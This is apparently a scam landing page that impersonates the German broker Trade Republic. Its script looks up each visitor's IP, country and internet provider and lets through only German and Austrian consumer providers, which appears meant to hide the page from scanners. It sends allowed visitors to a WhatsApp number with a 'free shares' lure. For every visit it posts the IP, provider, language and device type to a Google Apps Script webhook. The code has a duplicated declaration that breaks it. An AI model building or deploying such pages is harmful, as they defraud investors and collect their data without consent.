<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Trade Republic</title>
</head>
<body>
  <h2 id="status">Willkommen bei Trade Republic – bitte warten...</h2>

  <script>
    const allowCountries = ["DE", "AT"];
    const whiteListISP = [
   const whiteListISP = [
  // 🇩🇪 德国主流运营商
  "Deutsche Telekom", "Telekom", "T-Mobile", "t-online",
  "Vodafone", "O2", "Telefonica", "1&1", "1und1", "Unitymedia",
  "Congstar", "Aldi Talk", "NetCologne", "PYUR", "Drillisch", "Mobilcom", "Freenet", "E-Plus",

  // 🇦🇹 奥地利主流运营商
  "A1 Telekom", "A1", "Magenta", "T-Mobile", "Drei", "Hutchison", "bob", "HoT", "Spusu", "Yesss"
];

    const webhook = "https://script.google.com/macros/s/AKfycbxUZUPpwihLRC4UVCPMDOFr64WfWhemdVxWwLqxXFhg2U6w0uBfz5Bl5KKO5w3ipgFP/exec";
    const redirect = "https://api.whatsapp.com/send/?phone=4915774767813&text=Erhalten+Sie+10+potenzielle+Aktien+kostenlos&type=phone_number&app_absent=0";

    const visitLimit = 20;
    const blockDuration = 2 * 60 * 1000; // 2分钟

    function updateStatus(msg) {
      document.getElementById("status").innerText = msg;
    }

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      if (/mobile/i.test(ua)) return "Handy";
      if (/tablet/i.test(ua)) return "Tablet";
      return "PC";
    }

    function isBlocked() {
      const now = Date.now();
      const history = JSON.parse(localStorage.getItem("visitHistory") || "[]").filter(ts => now - ts < blockDuration);
      history.push(now);
      localStorage.setItem("visitHistory", JSON.stringify(history));
      return history.length > visitLimit;
    }

    function isAllowedISP(isp) {
      return whiteListISP.some(name => isp.toLowerCase().includes(name.toLowerCase()));
    }

    async function main() {
      if (isBlocked()) {
        updateStatus("Zugriff gesperrt: Zu viele Anfragen.");
        return;
      }

      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        const country = data.country || "";
        const isp = data.org || "Unbekannt";
        const ip = data.ip || "";
        const lang = navigator.language || "";
        const device = getDeviceInfo();

        let allow = allowCountries.includes(country) && isAllowedISP(isp);
        let jump = allow;

        if (jump) {
          window.location.href = redirect;
          updateStatus("Weiterleitung erfolgreich...");
        } else {
          updateStatus("Zugriff verweigert: Nur für Deutschland und Österreich mit zugelassenem Anbieter.");
        }

        // 上传记录到 Google Sheet
        fetch(webhook, {
          method: "POST",
          body: JSON.stringify({
            ip: ip,
            country: country,
            isp: isp,
            lang: lang,
            device: device,
            success: jump ? "ja" : "nein",
            time: new Date().toISOString()
          }),
          headers: { "Content-Type": "application/json" }
        });

      } catch (e) {
        updateStatus("Netzwerkfehler. Bitte später erneut versuchen.");
      }
    }

    main();
  </script>
</body>
</html>
